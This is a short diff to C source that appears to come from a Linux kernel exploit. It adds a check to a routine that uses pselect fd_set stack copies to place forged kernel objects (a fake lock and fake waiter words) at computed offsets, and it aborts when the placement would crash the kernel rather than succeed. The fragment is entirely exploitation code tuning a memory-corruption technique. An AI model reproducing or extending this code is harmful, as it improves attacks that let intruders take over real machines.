@@ -163,6 +163,21 @@ void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
 }
 
 void slide_pselect_stack_copy(void) {
+  /* Slide route feasibility: waiter words are 0..13 (slide convention),
+   * lock at word 11. slide_shift = fops_shift + 2 = derived shift.
+   * Need slide_shift + 11 <= max_global (14 for nfds=320). */
+  int slide_shift = slide_pselect_waiter_shift();
+  int wps = slide_pselect_words_per_set();
+  int max_global = 3 * wps - 1;
+  int lock_global = slide_shift + 11;
+  if (lock_global > max_global) {
+    pr_error(
+        "slide pselect route infeasible: slide_shift=%d places waiter lock "
+        "at global word %d but fd_set buffer only covers 0..%d (nfds=%d, "
+        "%d words/set). Aborting to prevent kernel panic.\n",
+        slide_shift, lock_global, max_global, SLIDE_PSELECT_NFDS, wps);
+    return;
+  }
   if (!page_base || !fake_lock || !fake_w0) {
     pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
              page_base, fake_lock, fake_w0);
